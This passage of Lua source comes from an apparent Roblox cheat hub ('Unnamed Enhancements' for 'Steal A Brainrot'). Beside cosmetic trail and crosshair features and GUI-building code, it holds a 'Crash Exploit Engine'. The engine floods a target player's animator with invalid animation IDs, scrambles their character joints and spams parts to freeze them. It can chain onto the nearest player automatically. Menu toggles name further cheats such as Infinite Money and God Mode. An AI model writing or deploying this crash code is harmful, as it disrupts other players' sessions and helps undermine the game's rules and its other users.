            trailPart.Transparency = 0.5
            trailPart.CFrame = hrp.CFrame
            trailPart.Parent = Services.Workspace

            table.insert(TrailParts, trailPart)
            Services.Debris:AddItem(trailPart, 0.8)

            while #TrailParts > 30 do
                local old = table.remove(TrailParts, 1)
                if old and old.Parent then
                    old:Destroy()
                end
            end
        end)

        Notifications:Notify("Trails enabled", 2, Color3.fromRGB(100, 200, 255))
    else
        if TrailConnection then
            TrailConnection:Disconnect()
            TrailConnection = nil
        end
        for _, part in ipairs(TrailParts) do
            if part and part.Parent then
                part:Destroy()
            end
        end
        TrailParts = {}
        Notifications:Notify("Trails disabled", 2, Color3.fromRGB(255, 100, 0))
    end
end

-- ============================================================
-- FEATURE: CUSTOM CROSSHAIR
-- ============================================================
local CrosshairGui = nil

local function ToggleCrosshair(enabled)
    if enabled then
        if CrosshairGui then CrosshairGui:Destroy() end

        CrosshairGui = Instance.new("ScreenGui")
        CrosshairGui.Name = "SAB_Crosshair"
        CrosshairGui.ResetOnSpawn = false
        CrosshairGui.Parent = Services.CoreGui

        local crosshairFrame = Instance.new("Frame")
        crosshairFrame.Size = UDim2.new(0, 30, 0, 30)
        crosshairFrame.Position = UDim2.new(0.5, -15, 0.5, -15)
        crosshairFrame.BackgroundTransparency = 1
        crosshairFrame.Parent = CrosshairGui

        local function CreateLine(anchor, size, pos)
            local line = Instance.new("Frame")
            line.Size = size
            line.Position = pos
            line.AnchorPoint = anchor
            line.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            line.BorderSizePixel = 0
            line.Parent = crosshairFrame
            return line
        end

        CreateLine(Vector2.new(0.5, 0), UDim2.new(0, 2, 0, 8), UDim2.new(0.5, 0, 0, 0))
        CreateLine(Vector2.new(0.5, 1), UDim2.new(0, 2, 0, 8), UDim2.new(0.5, 0, 1, 0))
        CreateLine(Vector2.new(0, 0.5), UDim2.new(0, 8, 0, 2), UDim2.new(0, 0, 0.5, 0))
        CreateLine(Vector2.new(1, 0.5), UDim2.new(0, 8, 0, 2), UDim2.new(1, -1, 0.5, 0))

        local dot = Instance.new("Frame")
        dot.Size = UDim2.new(0, 4, 0, 4)
        dot.Position = UDim2.new(0.5, -2, 0.5, -2)
        dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        dot.BorderSizePixel = 0
        dot.Parent = crosshairFrame

        local dotCorner = Instance.new("UICorner")
        dotCorner.CornerRadius = UDim.new(0.5, 0)
        dotCorner.Parent = dot
    else
        if CrosshairGui then
            CrosshairGui:Destroy()
            CrosshairGui = nil
        end
    end
end

-- ============================================================
-- CRASH EXPLOIT ENGINE (Animation Replication Attack)
-- ============================================================
local CrashState = {
    Enabled = Config.CrashEnabled or false,
    Active = false,
    Target = nil,
    Intensity = Config.CrashIntensity or 1.0,
    Duration = Config.CrashDuration or 8,
    AutoRefresh = Config.CrashAutoRefresh or false,
}

local function GenerateInvalidAnimationID()
    local ids = {
        "9999999999999999", "8888888888888888", "7777777777777777",
        "1234567890123456", "1111111111111111", "0000000000000000",
        "9999999999999998", "5555555555555555", "4444444444444444",
        "3333333333333333", "2222222222222222", "6666666666666666",
        "1010101010101010", "1212121212121212", "1414141414141414",
        "1515151515151515", "1616161616161616", "1717171717171717",
    }
    return ids[math.random(#ids)]
end

local function GetNearestPlayer()
    local myHRP = GetHRP()
    if not myHRP then return nil end
    local nearestDist = math.huge
    local nearest = nil
    for _, player in ipairs(Services.Players:GetPlayers()) do
        if player ~= LP then
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local dist = (hrp.Position - myHRP.Position).Magnitude
                    if dist < nearestDist then
                        nearestDist = dist
                        nearest = player
                    end
                end
            end
        end
    end
    return nearest
end

local function GetAllPlayers(includeSelf)
    local list = {}
    for _, player in ipairs(Services.Players:GetPlayers()) do
        if includeSelf or player ~= LP then
            table.insert(list, player)
        end
    end
    return list
end

local function CrashAnimationFlood(targetPlayer, intensity)
    intensity = intensity or CrashState.Intensity or 1.0

    -- Get or create an animator for the target
    local char = targetPlayer.Character or (targetPlayer.CharacterAdded:Wait() and targetPlayer.Character)
    if not char then return false end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end

    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = humanoid
    end

    local anim = Instance.new("Animation")
    anim.Name = "CrashAnim_" .. tostring(math.random(10000, 99999))
    anim.Parent = animator

    local frameCount = 0
    local yieldInterval = math.floor(20 / math.max(intensity, 0.1))
    local waitTime = math.max(0.001, 0.005 / intensity)
    local startTime = tick()
    local duration = CrashState.Duration * intensity

    while tick() - startTime < duration and CrashState.Active do
        anim.AnimationId = "rbxassetid://" .. GenerateInvalidAnimationID()

        local success, track = pcall(function()
            return animator:LoadAnimation(anim)
        end)

        if success and track then
            track:Play()
            task.wait(0.001)
            pcall(function()
                track:Stop()
                track:Destroy()
            end)
        end

        frameCount = frameCount + 1
        if frameCount % yieldInterval == 0 then
            task.wait(0.01)
        end
        task.wait(waitTime)
    end

    pcall(function()
        anim.Parent = nil
        anim:Destroy()
    end)
    return true
end

local function CrashMotorOverload(targetPlayer, intensity)
    intensity = intensity or CrashState.Intensity or 1.0
    local char = targetPlayer.Character or (targetPlayer.CharacterAdded:Wait() and targetPlayer.Character)
    if not char then return end

    local motors = {}
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("Motor6D") then
            table.insert(motors, v)
        end
    end
    if #motors == 0 then return end

    local startTime = tick()
    local duration = math.min(3, CrashState.Duration * 0.4 * intensity)

    while tick() - startTime < duration and CrashState.Active do
        for _, motor in ipairs(motors) do
            if motor and motor.Parent then
                pcall(function()
                    motor.C0 = CFrame.Angles(
                        math.random(-360 * intensity, 360 * intensity),
                        math.random(-360 * intensity, 360 * intensity),
                        math.random(-360 * intensity, 360 * intensity)
                    )
                    motor.C1 = CFrame.Angles(
                        math.random(-360 * intensity, 360 * intensity),
                        math.random(-360 * intensity, 360 * intensity),
                        math.random(-360 * intensity, 360 * intensity)
                    )
                end)
            end
        end
        task.wait(math.max(0.01, 0.03 / intensity))
    end

    for _, motor in ipairs(motors) do
        pcall(function()
            motor.C0 = CFrame.new()
            motor.C1 = CFrame.new()
        end)
    end
end

local function CrashInstanceFlood(targetPlayer, intensity)
    intensity = intensity or CrashState.Intensity or 1.0
    local startTime = tick()
    local duration = math.min(2, CrashState.Duration * 0.3 * intensity)

    while tick() - startTime < duration and CrashState.Active do
        local part = Instance.new("Part")
        part.Name = "CrashObj_" .. tostring(math.random(100000, 999999))
        part.Size = Vector3.new(math.random(), math.random(), math.random())
        part.CFrame = CFrame.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
        part.Anchored = true
        part.Parent = Services.Workspace
        Services.Debris:AddItem(part, 0)
        task.wait(math.max(0.001, 0.01 / intensity))
    end
end

local function StopCrashCleanup()
    local humanoid = GetHumanoid()
    if humanoid then
        local animator = humanoid:FindFirstChildOfClass("Animator")
        if animator then
            for _, v in ipairs(animator:GetChildren()) do
                if v:IsA("Animation") and v.Name:find("CrashAnim") then
                    v:Destroy()
                end
            end
            local tracks = animator:GetPlayingAnimationTracks()
            for _, track in ipairs(tracks) do
                pcall(function()
                    track:Stop(0)
                    track:Destroy()
                end)
            end
        end
        local char = GetCharacter()
        if char then
            for _, v in ipairs(char:GetDescendants()) do
                if v:IsA("Motor6D") then
                    pcall(function()
                        v.C0 = CFrame.new()
                        v.C1 = CFrame.new()
                    end)
                end
            end
        end
        humanoid.PlatformStand = false
    end
    CrashState.Active = false
end

local function ExecuteCrash(targetPlayer, intensity)
    if not CrashState.Enabled then
        Notifications:Notify("Crash disabled â€” toggle ON first", 3, Color3.fromRGB(255, 100, 0))
        return
    end
    if CrashState.Active then
        Notifications:Notify("Already crashing â€” stop first", 2, Color3.fromRGB(255, 100, 0))
        return
    end
    if not targetPlayer then
        Notifications:Notify("No target specified", 2, Color3.fromRGB(255, 50, 50))
        return
    end

    intensity = intensity or CrashState.Intensity or 1.0
    CrashState.Target = targetPlayer
    CrashState.Active = true

    local targetName = targetPlayer.Name
    local isSelf = targetPlayer == LP

    if isSelf then
        Notifications:Notify("SELF-TEST: Crashing yourself for 5s!", 5, Color3.fromRGB(255, 200, 0))
    else
        Notifications:Notify("Crashing " .. targetName, 3, Color3.fromRGB(255, 50, 50))
    end

    task.spawn(function()
        local threads = {
            coroutine.create(function() CrashAnimationFlood(targetPlayer, intensity) end),
            coroutine.create(function() CrashMotorOverload(targetPlayer, intensity) end),
            coroutine.create(function() CrashInstanceFlood(targetPlayer, intensity) end),
        }
        for _, t in ipairs(threads) do
            coroutine.resume(t)
        end
        for _, t in ipairs(threads) do
            while coroutine.status(t) ~= "dead" do
                task.wait()
            end
        end
        StopCrashCleanup()

        if isSelf then
            Notifications:Notify("Self-test complete â€” did you freeze?", 4, Color3.fromRGB(255, 200, 0))
        else
            Notifications:Notify("Crash cycle finished on " .. targetName, 3, Color3.fromRGB(255, 100, 0))
        end

        if CrashState.AutoRefresh and not isSelf then
            task.wait(1)
            if CrashState.Enabled and not CrashState.Active then
                local next = GetNearestPlayer()
                if next then
                    ExecuteCrash(next, intensity)
                end
            end
        end
    end)
end

local function CrashNearestPlayer()
    local nearest = GetNearestPlayer()
    if nearest then
        ExecuteCrash(nearest)
    else
        Notifications:Notify("No other players nearby", 2, Color3.fromRGB(255, 100, 0))
    end
end

local function CrashSelf()
    if not CrashState.Enabled then
        Notifications:Notify("Enable crash toggle first", 3, Color3.fromRGB(255, 100, 0))
        return
    end
    local savedDuration = CrashState.Duration
    local savedIntensity = CrashState.Intensity
    CrashState.Duration = 5
    CrashState.Intensity = 0.6
    ExecuteCrash(LP, 0.6)
    task.spawn(function()
        while CrashState.Active do task.wait(1) end
        CrashState.Duration = savedDuration
        CrashState.Intensity = savedIntensity
    end)
end

local function StopCrash()
    if CrashState.Active then
        CrashState.Active = false
        StopCrashCleanup()
        Notifications:Notify("Crash stopped", 2, Color3.fromRGB(100, 255, 100))
    else
        Notifications:Notify("No active crash running", 2, Color3.fromRGB(200, 200, 0))
    end
end

local function ToggleCrashSystem(enabled)
    CrashState.Enabled = enabled
    Config.CrashEnabled = enabled
    if not enabled and CrashState.Active then
        StopCrash()
    end
    SaveConfig()
end


-- ============================================================
-- GUI CONSTRUCTION â€” Unnamed Enhancements Style
-- ============================================================
local GUI = {}
local GUIToggles = {}

do
    local Theme = {
        Bg = Color3.fromRGB(13, 13, 16),
        Sidebar = Color3.fromRGB(16, 16, 20),
        Content = Color3.fromRGB(14, 14, 17),
        Card = Color3.fromRGB(22, 22, 28),
        Accent = Color3.fromRGB(124, 58, 237),
        AccentDark = Color3.fromRGB(91, 43, 176),
        Text = Color3.fromRGB(235, 235, 240),
        TextDim = Color3.fromRGB(130, 130, 142),
        TabActive = Color3.fromRGB(28, 28, 35),
        Border = Color3.fromRGB(38, 38, 46),
    }

    local SIDEBAR_W = 185
    local TOPBAR_H = 44
    local WIN_W, WIN_H = 680, 460

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "UE_SAB_Hub"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.DisplayOrder = 998
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.Enabled = true
    pcall(function() ScreenGui.Parent = Services.CoreGui end)
    if not ScreenGui.Parent then
        ScreenGui.Parent = LP:WaitForChild("PlayerGui")
    end

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainWindow"
    MainFrame.Size = UDim2.new(0, WIN_W, 0, WIN_H)
    MainFrame.Position = UDim2.new(0.5, -WIN_W / 2, 0.5, -WIN_H / 2)
    MainFrame.BackgroundColor3 = Theme.Bg
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Visible = false
    MainFrame.Parent = ScreenGui

    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 10)
    mainCorner.Parent = MainFrame

    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Theme.Border
    mainStroke.Thickness = 1
    mainStroke.Parent = MainFrame

    -- Top bar
    local TopBar = Instance.new("Frame")
    TopBar.Name = "TopBar"
    TopBar.Size = UDim2.new(1, 0, 0, TOPBAR_H)
    TopBar.BackgroundColor3 = Theme.Sidebar
    TopBar.BorderSizePixel = 0
    TopBar.Parent = MainFrame

    local topLine = Instance.new("Frame")
    topLine.Size = UDim2.new(1, 0, 0, 1)
    topLine.Position = UDim2.new(0, 0, 1, -1)
    topLine.BackgroundColor3 = Theme.Border
    topLine.BorderSizePixel = 0
    topLine.Parent = TopBar

    local function MakeMacDot(color, x)
        local dot = Instance.new("TextButton")
        dot.Size = UDim2.new(0, 12, 0, 12)
        dot.Position = UDim2.new(0, x, 0.5, -6)
        dot.BackgroundColor3 = color
        dot.Text = ""
        dot.BorderSizePixel = 0
        dot.AutoButtonColor = false
        dot.Parent = TopBar
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(1, 0)
        c.Parent = dot
        return dot
    end

    MakeMacDot(Color3.fromRGB(255, 95, 87), 14).MouseButton1Click:Connect(function()
        MainFrame.Visible = false
    end)
    MakeMacDot(Color3.fromRGB(255, 189, 46), 32).MouseButton1Click:Connect(function()
        MainFrame.Visible = false
    end)
    MakeMacDot(Color3.fromRGB(39, 201, 63), 50)

    local TitleMain = Instance.new("TextLabel")
    TitleMain.Size = UDim2.new(1, -200, 0, 18)
    TitleMain.Position = UDim2.new(0, 78, 0, 6)
    TitleMain.BackgroundTransparency = 1
    TitleMain.Text = "UNNAMED ENHANCEMENTS"
    TitleMain.TextColor3 = Theme.Text
    TitleMain.TextXAlignment = Enum.TextXAlignment.Left
    TitleMain.TextSize = 15
    TitleMain.Font = Enum.Font.GothamBold
    TitleMain.Parent = TopBar

    local TitleSub = Instance.new("TextLabel")
    TitleSub.Size = UDim2.new(1, -200, 0, 14)
    TitleSub.Position = UDim2.new(0, 78, 0, 24)
    TitleSub.BackgroundTransparency = 1
    TitleSub.Text = "Steal A Brainrot Hub  |  Right Shift"
    TitleSub.TextColor3 = Theme.TextDim
    TitleSub.TextXAlignment = Enum.TextXAlignment.Left
    TitleSub.TextSize = 11
    TitleSub.Font = Enum.Font.Gotham
    TitleSub.Parent = TopBar

    local VersionTag = Instance.new("TextLabel")
    VersionTag.Size = UDim2.new(0, 50, 0, 20)
    VersionTag.Position = UDim2.new(1, -62, 0.5, -10)
    VersionTag.BackgroundColor3 = Theme.Card
    VersionTag.Text = "v3.0"
    VersionTag.TextColor3 = Theme.Accent
    VersionTag.TextSize = 11
    VersionTag.Font = Enum.Font.GothamMedium
    VersionTag.Parent = TopBar
    local vCorner = Instance.new("UICorner")
    vCorner.CornerRadius = UDim.new(0, 4)
    vCorner.Parent = VersionTag

    -- Drag from top bar
    local dragging, dragStart, startPos = false, nil, nil
    TopBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
        end
    end)
    TopBar.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    Services.UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    -- Body layout
    local Body = Instance.new("Frame")
    Body.Size = UDim2.new(1, 0, 1, -TOPBAR_H)
    Body.Position = UDim2.new(0, 0, 0, TOPBAR_H)
    Body.BackgroundTransparency = 1
    Body.Parent = MainFrame

    local Sidebar = Instance.new("Frame")
    Sidebar.Size = UDim2.new(0, SIDEBAR_W, 1, -52)
    Sidebar.BackgroundColor3 = Theme.Sidebar
    Sidebar.BorderSizePixel = 0
    Sidebar.Parent = Body

    local sideLine = Instance.new("Frame")
    sideLine.Size = UDim2.new(0, 1, 1, 0)
    sideLine.Position = UDim2.new(1, -1, 0, 0)
    sideLine.BackgroundColor3 = Theme.Border
    sideLine.BorderSizePixel = 0
    sideLine.Parent = Sidebar

    local TabScroll = Instance.new("ScrollingFrame")
    TabScroll.Size = UDim2.new(1, 0, 1, 0)
    TabScroll.BackgroundTransparency = 1
    TabScroll.BorderSizePixel = 0
    TabScroll.ScrollBarThickness = 3
    TabScroll.ScrollBarImageColor3 = Theme.Accent
    TabScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    TabScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    TabScroll.Parent = Sidebar

    local TabList = Instance.new("UIListLayout")
    TabList.Padding = UDim.new(0, 2)
    TabList.SortOrder = Enum.SortOrder.LayoutOrder
    TabList.Parent = TabScroll

    local UserPanel = Instance.new("Frame")
    UserPanel.Size = UDim2.new(1, 0, 0, 52)
    UserPanel.Position = UDim2.new(0, 0, 1, -52)
    UserPanel.BackgroundColor3 = Theme.Card
    UserPanel.BorderSizePixel = 0
    UserPanel.Parent = Sidebar

    local userLine = Instance.new("Frame")
    userLine.Size = UDim2.new(1, 0, 0, 1)
    userLine.BackgroundColor3 = Theme.Border
    userLine.BorderSizePixel = 0
    userLine.Parent = UserPanel

    local AvatarCircle = Instance.new("Frame")
    AvatarCircle.Size = UDim2.new(0, 28, 0, 28)
    AvatarCircle.Position = UDim2.new(0, 10, 0.5, -14)
    AvatarCircle.BackgroundColor3 = Theme.Accent
    AvatarCircle.Parent = UserPanel
    local ac = Instance.new("UICorner")
    ac.CornerRadius = UDim.new(1, 0)
    ac.Parent = AvatarCircle

    local AvatarLetter = Instance.new("TextLabel")
    AvatarLetter.Size = UDim2.new(1, 0, 1, 0)
    AvatarLetter.BackgroundTransparency = 1
    AvatarLetter.Text = string.sub(LP.Name, 1, 1):upper()
    AvatarLetter.TextColor3 = Color3.new(1, 1, 1)
    AvatarLetter.Font = Enum.Font.GothamBold
    AvatarLetter.TextSize = 14
    AvatarLetter.Parent = AvatarCircle

    local UserName = Instance.new("TextLabel")
    UserName.Size = UDim2.new(1, -48, 0, 16)
    UserName.Position = UDim2.new(0, 46, 0, 10)
    UserName.BackgroundTransparency = 1
    UserName.Text = LP.Name
    UserName.TextColor3 = Theme.Text
    UserName.TextXAlignment = Enum.TextXAlignment.Left
    UserName.TextSize = 12
    UserName.Font = Enum.Font.GothamMedium
    UserName.TextTruncate = Enum.TextTruncate.AtEnd
    UserName.Parent = UserPanel

    local UserSub = Instance.new("TextLabel")
    UserSub.Size = UDim2.new(1, -48, 0, 14)
    UserSub.Position = UDim2.new(0, 46, 0, 28)
    UserSub.BackgroundTransparency = 1
    UserSub.Text = "Premium Hub"
    UserSub.TextColor3 = Theme.Accent
    UserSub.TextXAlignment = Enum.TextXAlignment.Left
    UserSub.TextSize = 10
    UserSub.Font = Enum.Font.Gotham
    UserSub.Parent = UserPanel

    local ContentPanel = Instance.new("Frame")
    ContentPanel.Size = UDim2.new(1, -SIDEBAR_W, 1, 0)
    ContentPanel.Position = UDim2.new(0, SIDEBAR_W, 0, 0)
    ContentPanel.BackgroundColor3 = Theme.Content
    ContentPanel.BorderSizePixel = 0
    ContentPanel.Parent = Body

    local Tabs = {}
    local TabButtons = {}

    local function SelectTab(tabData, tabBtn)
        for _, t in ipairs(Tabs) do
            t.Frame.Visible = false
        end
        for _, btn in ipairs(TabButtons) do
            btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            btn.BackgroundTransparency = 1
            if btn:FindFirstChild("AccentBar") then
                btn.AccentBar.Visible = false
            end
            btn.TextColor3 = Theme.TextDim
        end
        tabData.Frame.Visible = true
        tabBtn.BackgroundColor3 = Theme.TabActive
        tabBtn.BackgroundTransparency = 0
        if tabBtn:FindFirstChild("AccentBar") then
            tabBtn.AccentBar.Visible = true
        end
        tabBtn.TextColor3 = Theme.Text
    end

    function GUI:CreateTab(name, icon)
        icon = icon or "â€¢"
        local tabFrame = Instance.new("ScrollingFrame")
        tabFrame.Size = UDim2.new(1, -16, 1, -16)
        tabFrame.Position = UDim2.new(0, 8, 0, 8)
        tabFrame.BackgroundTransparency = 1
        tabFrame.BorderSizePixel = 0
        tabFrame.ScrollBarThickness = 4
        tabFrame.ScrollBarImageColor3 = Theme.Accent
        tabFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
        tabFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
        tabFrame.Visible = false
        tabFrame.Parent = ContentPanel

        local tabLayout = Instance.new("UIListLayout")
        tabLayout.Padding = UDim.new(0, 6)
        tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
        tabLayout.Parent = tabFrame

        local tabBtn = Instance.new("TextButton")
        tabBtn.Size = UDim2.new(1, -8, 0, 34)
        tabBtn.BackgroundColor3 = Theme.TabActive
        tabBtn.BackgroundTransparency = 1
        tabBtn.BorderSizePixel = 0
        tabBtn.Text = "  " .. icon .. "   " .. name
        tabBtn.TextColor3 = Theme.TextDim
        tabBtn.TextSize = 13
        tabBtn.TextXAlignment = Enum.TextXAlignment.Left
        tabBtn.Font = Enum.Font.GothamMedium
        tabBtn.AutoButtonColor = false
        tabBtn.Parent = TabScroll

        local accentBar = Instance.new("Frame")
        accentBar.Name = "AccentBar"
        accentBar.Size = UDim2.new(0, 3, 0.6, 0)
        accentBar.Position = UDim2.new(0, 0, 0.2, 0)
        accentBar.BackgroundColor3 = Theme.Accent
        accentBar.BorderSizePixel = 0
        accentBar.Visible = false
        accentBar.Parent = tabBtn
        local abCorner = Instance.new("UICorner")
        abCorner.CornerRadius = UDim.new(0, 2)
        abCorner.Parent = accentBar

        tabBtn.MouseEnter:Connect(function()
            if not tabFrame.Visible then
                tabBtn.BackgroundTransparency = 0.5
                tabBtn.BackgroundColor3 = Theme.TabActive
            end
        end)
        tabBtn.MouseLeave:Connect(function()
            if not tabFrame.Visible then
                tabBtn.BackgroundTransparency = 1
            end
        end)

        table.insert(TabButtons, tabBtn)
        local tabData = {Frame = tabFrame, Layout = tabLayout, Name = name, Button = tabBtn}
        table.insert(Tabs, tabData)

        tabBtn.MouseButton1Click:Connect(function()
            SelectTab(tabData, tabBtn)
        end)

        if #Tabs == 1 then
            SelectTab(tabData, tabBtn)
        end

        return tabData
    end

    function GUI:CreateSection(tab, text)
        local section = Instance.new("TextLabel")
        section.Size = UDim2.new(1, -8, 0, 22)
        section.BackgroundTransparency = 1
        section.Text = string.upper(text)
        section.TextColor3 = Theme.Accent
        section.TextXAlignment = Enum.TextXAlignment.Left
        section.TextSize = 11
        section.Font = Enum.Font.GothamBold
        section.Parent = tab.Frame
        return section
    end

    function GUI:CreateLabel(tab, text)
        return GUI:CreateSection(tab, text)
    end

    function GUI:CreateToggle(tab, text, default, callback, key)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -8, 0, 38)
        row.BackgroundColor3 = Theme.Card
        row.BorderSizePixel = 0
        row.Parent = tab.Frame
        local rc = Instance.new("UICorner")
        rc.CornerRadius = UDim.new(0, 6)
        rc.Parent = row

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -54, 1, 0)
        label.Position = UDim2.new(0, 12, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = Theme.Text
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextSize = 13
        label.Font = Enum.Font.GothamMedium
        label.Parent = row

        local switch = Instance.new("TextButton")
        switch.Size = UDim2.new(0, 42, 0, 22)
        switch.Position = UDim2.new(1, -50, 0.5, -11)
        switch.BackgroundColor3 = default and Theme.Accent or Color3.fromRGB(45, 45, 52)
        switch.Text = ""
        switch.BorderSizePixel = 0
        switch.AutoButtonColor = false
        switch.Parent = row
        local sc = Instance.new("UICorner")
        sc.CornerRadius = UDim.new(1, 0)
        sc.Parent = switch

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 18, 0, 18)
        knob.Position = default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
        knob.BackgroundColor3 = Color3.new(1, 1, 1)
        knob.BorderSizePixel = 0
        knob.Parent = switch
        local kc = Instance.new("UICorner")
        kc.CornerRadius = UDim.new(1, 0)
        kc.Parent = knob

        local state = default
        local function UpdateToggle()
            switch.BackgroundColor3 = state and Theme.Accent or Color3.fromRGB(45, 45, 52)
            knob.Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
        end

        switch.MouseButton1Click:Connect(function()
            state = not state
            UpdateToggle()
            pcall(callback, state)
        end)

        local ref = {
            Set = function(_, val) state = val; UpdateToggle() end,
            Get = function() return state end
        }
        if key then GUIToggles[key] = ref end
        return ref
    end

    function GUI:CreateButton(tab, text, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -8, 0, 36)
        btn.BackgroundColor3 = Theme.Card
        btn.BorderSizePixel = 0
        btn.Text = text
        btn.TextColor3 = Theme.Text
        btn.TextSize = 13
        btn.Font = Enum.Font.GothamMedium
        btn.AutoButtonColor = false
        btn.Parent = tab.Frame
        local bc = Instance.new("UICorner")
        bc.CornerRadius = UDim.new(0, 6)
        bc.Parent = btn

        btn.MouseButton1Click:Connect(function() pcall(callback) end)
        btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Theme.TabActive end)
        btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Theme.Card end)
        return btn
    end

    function GUI:CreateSlider(tab, text, min, max, default, callback)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -8, 0, 48)
        row.BackgroundColor3 = Theme.Card
        row.BorderSizePixel = 0
        row.Parent = tab.Frame
        local rc = Instance.new("UICorner")
        rc.CornerRadius = UDim.new(0, 6)
        rc.Parent = row

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -16, 0, 18)
        label.Position = UDim2.new(0, 12, 0, 6)
        label.BackgroundTransparency = 1
        label.Text = text .. ": " .. tostring(default)
        label.TextColor3 = Theme.Text
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextSize = 12
        label.Font = Enum.Font.GothamMedium
        label.Parent = row

        local bar = Instance.new("Frame")
        bar.Size = UDim2.new(1, -24, 0, 5)
        bar.Position = UDim2.new(0, 12, 0, 30)
        bar.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
        bar.BorderSizePixel = 0
        bar.Parent = row
        local bc = Instance.new("UICorner")
        bc.CornerRadius = UDim.new(1, 0)
        bc.Parent = bar

        local rel = (default - min) / (max - min)
        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(rel, 0, 1, 0)
        fill.BackgroundColor3 = Theme.Accent
        fill.BorderSizePixel = 0
        fill.Parent = bar
        local fc = Instance.new("UICorner")
        fc.CornerRadius = UDim.new(1, 0)
        fc.Parent = fill

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 12, 0, 12)
        knob.Position = UDim2.new(rel, -6, 0.5, -6)
        knob.BackgroundColor3 = Color3.new(1, 1, 1)
        knob.BorderSizePixel = 0
        knob.Parent = bar
        local kc = Instance.new("UICorner")
        kc.CornerRadius = UDim.new(1, 0)
        kc.Parent = knob

        local dragging, value = false, default
        knob.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end end)
        knob.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
        bar.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                local absPos = bar.AbsolutePosition.X
                local absSize = bar.AbsoluteSize.X
                local r = math.clamp((i.Position.X - absPos) / absSize, 0, 1)
                value = math.clamp(math.floor(min + (max - min) * r + 0.5), min, max)
                r = (value - min) / (max - min)
                fill.Size = UDim2.new(r, 0, 1, 0)
                knob.Position = UDim2.new(r, -6, 0.5, -6)
                label.Text = text .. ": " .. tostring(value)
                pcall(callback, value)
            end
        end)
        Services.UserInputService.InputChanged:Connect(function(i)
            if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
                local absPos = bar.AbsolutePosition.X
                local absSize = bar.AbsoluteSize.X
                local r = math.clamp((i.Position.X - absPos) / absSize, 0, 1)
                value = math.clamp(math.floor(min + (max - min) * r + 0.5), min, max)
                r = (value - min) / (max - min)
                fill.Size = UDim2.new(r, 0, 1, 0)
                knob.Position = UDim2.new(r, -6, 0.5, -6)
                label.Text = text .. ": " .. tostring(value)
                pcall(callback, value)
            end
        end)

        return {
            Get = function() return value end,
            Set = function(_, v)
                value = math.clamp(v, min, max)
                local r2 = (value - min) / (max - min)
                fill.Size = UDim2.new(r2, 0, 1, 0)
                knob.Position = UDim2.new(r2, -6, 0.5, -6)
                label.Text = text .. ": " .. tostring(value)
            end
        }
    end

    GUI.MainFrame = MainFrame
    GUI.ScreenGui = ScreenGui
    GUI.ToggleVisible = function()
        MainFrame.Visible = not MainFrame.Visible
    end
end

-- ============================================================
-- BUILD GUI TABS
-- ============================================================
local TabMain = GUI:CreateTab("Main", ">")
GUI:CreateSection(TabMain, "General")
GUI:CreateToggle(TabMain, "Infinite Money", Config.InfiniteMoney, function(v)
    Config.InfiniteMoney = v; ToggleInfiniteMoney(v); SaveConfig()
end, "InfiniteMoney")
GUI:CreateToggle(TabMain, "God Mode", Config.GodMode, function(v)
    Config.GodMode = v; ToggleGodMode(v); SaveConfig()
end, "GodMode")
GUI:CreateToggle(TabMain, "Auto Complete", Config.AutoComplete, function(v)
    Config.AutoComplete = v; ToggleAutoComplete(v); SaveConfig()
end, "AutoComplete")
GUI:CreateToggle(TabMain, "Anti-AFK", Config.AntiAFK, function(v)
